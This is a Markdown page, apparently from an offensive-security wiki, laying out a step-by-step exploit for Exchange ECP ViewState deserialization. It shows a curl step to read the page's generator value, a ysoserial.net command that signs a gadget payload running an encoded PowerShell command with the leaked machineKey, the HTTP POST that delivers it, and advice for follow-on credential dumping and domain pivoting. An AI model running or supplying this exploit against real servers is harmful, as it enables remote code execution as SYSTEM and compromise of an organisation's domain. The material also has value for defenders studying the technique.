---
title: "ViewState deserialization: forging __VIEWSTATE with a leaked machineKey"
description: "Reaching code execution on Exchange ECP by forging a __VIEWSTATE blob signed with a static or leaked ASP.NET machineKey (validationKey and decryptionKey from web.config), so the ECP app pool deserializes attacker-controlled .NET objects via BinaryFormatter and runs code as the Exchange identity. Uses ysoserial.net to build the payload."
keywords:
  - ViewState deserialization
  - machineKey
  - validationKey
  - ysoserial.net
  - ECP
---

# ViewState deserialization

ASP.NET pages round-trip page state in a hidden `__VIEWSTATE` field, protected by the application's **`machineKey`** (a `validationKey` and `decryptionKey` in `web.config`). The server trusts any `__VIEWSTATE` that carries a valid signature under those keys, deserializing it with `BinaryFormatter` before the page runs. The ECP application (`/ecp/default.aspx`) is an ASP.NET app like any other. If you know its `machineKey`, you forge a `__VIEWSTATE` that deserializes into a gadget chain executing a command, sign it with the keys, and POST it: the ECP app pool deserializes it and runs your command as the Exchange identity, typically `SYSTEM`. This is build-independent; it depends entirely on **key exposure**, not on an unpatched proxy.

## Preconditions

- The ECP `machineKey` (`validationKey`, `decryptionKey`, and the algorithms). This comes from a static key shipped in a vulnerable build, a key leaked through another bug (an SSRF read of `web.config`, or a ProxyLogon-style back-end file read), or recovery from a foothold.
- A reachable `/ecp/` and a valid `__VIEWSTATEGENERATOR` value for the target page (it is static per page and visible in the page HTML, or a known default).
- The `__VIEWSTATEGENERATOR` and keys must match the target page so the signature validates.

## Step 1: confirm the page and generator

Fetch the ECP page and read the generator token that pins the ViewState to this page:

```bash
curl -sk 'https://mail.example.com/ecp/default.aspx' | grep -oE '__VIEWSTATEGENERATOR" value="[0-9A-F]+"'
# -> __VIEWSTATEGENERATOR" value="B97B4E27"
```

A returned generator value confirms the page serves ViewState and gives the token to sign against. If ECP requires a session before reaching `default.aspx`, pair this with a valid ECP cookie or an SSRF that reaches the page.

## Step 2: forge the signed ViewState payload

`ysoserial.net` builds a `__VIEWSTATE` for a chosen gadget (`TypeConfuseDelegate` is the common one), signs it with the leaked keys, and binds it to the page path and generator so the signature validates server-side:

```bash
# Build a signed ViewState that runs a command when deserialized
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "powershell -enc <base64 payload>" \
  --path="/ecp/default.aspx" \
  --apppath="/ecp" \
  --generator="B97B4E27" \
  --validationkey="<leaked-validationKey>" \
  --validationalg="SHA1" \
  --decryptionkey="<leaked-decryptionKey>" \
  --decryptionalg="AES"
# outputs a long URL-encoded __VIEWSTATE string
```

The output is the URL-encoded `__VIEWSTATE` value. `--path` and `--apppath` must match the request URL exactly, and `--generator` must match step 1, or the server rejects the signature before deserializing.

## Step 3: POST it to the page

Send the forged ViewState to the same page and generator. The server validates the signature (it passes, because you signed with the real keys), then deserializes and runs the gadget:

```http
POST /ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=<forged-urlencoded-viewstate> HTTP/1.1
Host: mail.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

Interpret the result: a `500` ViewState error that is **not** a MAC validation failure usually means the gadget ran and the page then errored on the mangled state, which is the expected success signature; verify by the side effect (a callback, a written file, `whoami` output in a staged location). A `500` reading "validation of viewstate MAC failed" means the keys, path, or generator do not match, so recheck all three.

## Variants and follow-on

- The same technique applies to any Exchange ASP.NET path that round-trips ViewState once you hold its `machineKey`; ECP `default.aspx` is the reliable one.
- Gadget choice can be swapped (`TypeConfuseDelegate`, `ActivitySurrogateSelector`) when one is blocked by the server's deserialization binder.
- Code runs as the ECP app-pool identity, generally `SYSTEM`; follow on exactly as any Exchange `SYSTEM`, dumping credentials and pivoting to the domain through Exchange's AD rights (see the [RCE chains overview](index.md) and [PrivExchange](../privexchange.md)).

## Exploitation notes

- The whole technique rests on key exposure: a static key in a vulnerable build, or a key read through a chained SSRF/file-read, so this is the natural second stage after a [ProxyLogon](proxylogon.md) back-end file read that leaks `web.config`.
- The three binding values (`path`, `apppath`, `generator`) plus the keys all have to match; a MAC-failure `500` is the signature not validating, not the gadget failing.
- It is build-independent, so it can land on a server patched against the proxy chains, as long as the `machineKey` is known.

## Tools

- **ysoserial.net** (`-p ViewState`): forge and sign the `__VIEWSTATE` payload.
- **curl / Burp**: POST the forged ViewState and read the response signature.
- **Metasploit** (`exchange_ecp_viewstate` style modules): maintained wrappers when keys are known.

## References

- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [Soroush Dalili / NCC: ASP.NET ViewState deserialization](https://www.nccgroup.com/us/research-blog/reliable-net-remoting-and-viewstate-deserialization/)
- [ZDI: exploiting Exchange PowerShell and ECP primitives](https://www.thezdi.com/blog/2024/9/11/exploiting-exchange-powershell-after-proxynotshell-part-2-approvedapplicationcollection)
